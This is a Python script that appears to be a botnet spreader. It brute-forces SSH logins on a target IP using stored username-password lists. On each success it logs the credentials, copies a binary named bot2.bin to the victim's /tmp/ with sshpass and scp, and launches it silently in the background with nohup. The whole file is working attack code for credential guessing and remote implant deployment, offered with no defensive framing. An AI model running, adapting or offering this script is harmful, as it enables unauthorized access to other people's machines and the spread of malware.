#!/usr/bin/python3
import os.path
import sys
from Class.Looper import Looper
from Class.Shell import shell
from Class.Tools import Utils
from Class.Colors import Colors

USER_PASS = Looper("./resources/passwords.txt", True).loop()
IP = sys.argv[1]
PROTOCOLS = Looper("./resources/protocols.txt", True).loop()
HERE = shell().execom("pwd")["subprocess"][0].rstrip()
FILE = "./resources/bot2.bin"
BINF = os.path.join(HERE, FILE)
DEF_DEST = "/tmp/"
OS = ""
duck = """
                  __
              ___( o)>
              \ <_. )
               `---'
"""

def scan(ip):
    """
    scan job
    :param ip:
    :return:
    """
    for protocol in PROTOCOLS:
        for u_p in USER_PASS:
            if "ssh" in protocol[1]:
                if not Utils().test_ssh(ip, u_p, protocol):
                    print("nope for {} {}:{}".format(ip, u_p[0], u_p[1]))
                else:
                    print("{} {} {} {} success with {}:{}".format(Colors.OKGREEN, duck, Colors.END, ip, u_p[0], u_p[1]))
                    shell().execom('echo "{} {}:{}" >> availables_at_`date+ %d-%m-%Y`.txt'.format(ip, u_p[0], u_p[1]))
                    sync(FILE, u_p[0], u_p[1], protocol[0], BINF, ip, DEF_DEST)
                    break


def sync(file, usr, pwd, port, source, ip, dst):
    copy = 'sshpass -p {} scp -P {} {} {}@{}:{}'.format(pwd.rstrip(), port.rstrip(), "./{}".format(file.rstrip()),
                                                        usr.rstrip(),
                                                        ip.rstrip(), dst)
    _exec = shell().execom(copy)
    if _exec["retcode"] == 0:
        print("{} succesfully uploaded @{}:{}".format(source, ip, dst))
        os.system("sshpass -p {} ssh {}@{} -p {} '$(nohup /tmp/./bot2.bin > /dev/null 2>&1 &)'".format(
            pwd.rstrip(), usr.rstrip(),
            ip.rstrip(), port.rstrip()))
    else:
        print("failed to load {} @ {}:{}".format(file, ip, {dst}))


def main():
    Utils().dbg("{}start bruteforce {}{}".format(Colors.WARNING, sys.argv[1], Colors.END))
    # for ip in ips (passed as arg)
    scan(IP)


main()
sys.exit(1)
